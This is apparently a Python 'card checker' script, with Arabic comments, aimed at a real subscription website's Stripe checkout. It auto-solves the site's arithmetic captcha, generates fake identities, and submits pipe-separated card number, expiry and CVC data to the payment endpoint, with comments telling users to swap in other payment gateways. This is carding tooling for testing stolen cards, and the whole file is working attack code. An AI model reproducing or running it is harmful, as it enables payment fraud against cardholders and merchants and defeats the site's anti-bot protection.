from bs4 import BeautifulSoup
import requests
from faker import Faker
import random
faker = Faker()
fake = Faker()
# اذا تريد تركب بوابه بدل هذي
#احذف ذي الداله
def StripCabtcha_Cokies():
    try:
        fer = faker.first_name()
        lat = faker.first_name()
        no = faker.first_name().upper()
        mo = faker.first_name().upper()
        name = f"{no} {mo}"
        psw = faker.password()
        hell = ''.join(random.choice('qwaszxcerdfvbtyghnmjkluiop0987654321') for i in range(17))
        domin = random.choice(['@hotmail.com', '@aol.com', '@gmail.com', '@yahoo.com'])
        email = hell + domin
        eq = "https://www.lagreeod.com/subscribe"
        hh = requests.get(eq, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',}).cookies['ci_session']
        cookies = {'ci_session': hh}
        hd = {
            'authority': 'www.lagreeod.com',
            'accept': '*/*',
            'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
            'referer': 'https://www.lagreeod.com/subscribe',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        #slove Capatcha Number bb.!
        rw = requests.get('https://www.lagreeod.com/register/check_sess_numbers', cookies=cookies, headers=hd).json()
        sm = rw['broj1']
        smok = rw['broj2']
        allf = smok + sm
        print(allf)
        try:
            os.remove('strip1_coki.txt')
            os.remove('strip1_num.txt')
        except:
            pass

        with open('strip1_coki.txt', 'a') as f:
            f.write(str(cookies) + '\n')

        with open('strip1_num.txt', 'a') as t:
            t.write(f"{sm}|{allf}|{fer}|{lat}|{name}|{psw}|{email}\n")

    except Exception as e:
        print(e)
        StripCabtcha_Cokies()
  
#ركب البوابه هنا      
def Payment(P):
    try:
        n, mm, yy, cvc = map(str.strip, P.split("|"))
        if yy.startswith('20'):
           yy = yy.split('20')[1]      
        try:
            with open("strip1_num.txt", "r") as f:
                for line in f:
                    sm = line.strip().split('|')[0]
                    allf = line.strip().split('|')[1]
                    fer = line.strip().split('|')[2]
                    lat = line.strip().split('|')[3]
                    name = line.strip().split('|')[4]
                    psw = line.strip().split('|')[5]
                    email = line.strip().split('|')[6]

            with open("strip1_coki.txt", "r") as f:
                for line in f:
                    cookies = eval(line.strip())

        except:
            StripCabtcha_Cokies()
            with open("strip1_num.txt", "r") as f:
                for line in f:
                    sm = line.strip().split('|')[0]
                    allf = line.strip().split('|')[1]
                    fer = line.strip().split('|')[2]
                    lat = line.strip().split('|')[3]
                    name = line.strip().split('|')[4]
                    psw = line.strip().split('|')[5]
                    email = line.strip().split('|')[6]

            with open("strip1_coki.txt", "r") as f:
                for line in f:
                    cookies = eval(line.strip())
                    
        
        headers = {
            'authority': 'www.lagreeod.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.lagreeod.com',
            'referer': 'https://www.lagreeod.com/subscribe',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'stripe_customer': '',
            'subscription_type': 'Annual Subscription',
            'firstname': fer,
            'lastname': lat,
            'email': email,
            'password': psw,
            'card[name]': name,
            'card[number]': n,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'card[cvc]': cvc,
            'coupon': '',
            's1': sm,
            'sum': allf,
        }

        res = requests.post('https://www.lagreeod.com/register/validate_subscribe', cookies=cookies, headers=headers, data=data)
        if 'Wrong result. Please sum these two numbers correctly.' in res.text or 'That email has already been taken. Please choose another.' in res.text or 'firstname' in res.text:
            msg = "Something Wrong Please Return Your Card Again"
            print(msg)
            StripCabtcha_Cokies()
        else:
            try:
                return res.json()
            except:
                return {"error": "Response content is not in JSON format", "details": res.text}

    except Exception as e:
        return {"error": str(e)}
    	
        